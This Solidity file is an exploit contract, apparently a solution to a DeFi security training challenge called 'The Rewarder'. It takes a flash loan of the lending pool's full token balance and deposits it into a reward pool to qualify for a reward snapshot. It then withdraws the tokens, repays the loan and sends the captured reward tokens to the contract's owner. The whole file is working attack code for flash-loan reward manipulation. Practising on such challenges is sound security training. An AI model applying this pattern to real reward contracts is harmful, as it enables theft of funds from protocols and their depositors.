// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";

contract TheRewarderPoolExp {
    FlashLoanerPool lend;
    TheRewarderPool rewarder;
    address owner;

    constructor(FlashLoanerPool _lend, TheRewarderPool _rewarder) {
        lend = _lend;
        rewarder = _rewarder;
        owner = msg.sender;
    }

    function exp() public {
        lend.flashLoan(
            ERC20(rewarder.liquidityToken()).balanceOf(address(lend))
        );
    }

    function receiveFlashLoan(uint256 amt) external {
        ERC20 liquidityToken = ERC20(rewarder.liquidityToken());
        liquidityToken.approve(address(rewarder), type(uint256).max);
        rewarder.deposit(amt);
        rewarder.withdraw(amt);
        liquidityToken.transfer(address(lend), amt);
        RewardToken rewardToken = rewarder.rewardToken();
        uint256 reward = rewardToken.balanceOf(address(this));
        assert(reward > 0);
        rewardToken.transfer(owner, reward);
        console.log("reward", owner, reward);
    }
}
